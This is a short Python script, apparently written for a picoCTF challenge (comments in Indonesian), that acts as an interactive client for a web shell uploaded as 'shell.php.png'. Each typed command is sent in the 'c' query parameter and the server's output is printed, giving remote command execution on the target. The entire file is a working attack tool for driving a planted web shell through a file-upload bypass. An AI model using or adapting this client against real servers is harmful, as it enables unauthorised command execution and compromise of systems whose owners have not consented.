import requests
from cmd import Cmd

# skeleton untuk looping command  
class Terminal(Cmd):
    prompt = "Command: "


    def __init__(self):
        self.mulai_initialisasi()
        super().__init__()

    # Di Panggil Pada Saat Initialisasi skeleton
    def mulai_initialisasi(self):
        print("Tool Simple Commang Injection")        
        pass

    def default(self, args):
        url = "http://amiable-citadel.picoctf.net:50589/images/shell.php.png?c="
        url = url + args
        r = requests.get(url)
        print(r.text)

    def do_exit(self, args):
        print(f"[+] Terminal di tutup ~ aka : Lodwig")
        return True


console = Terminal()
console.cmdloop()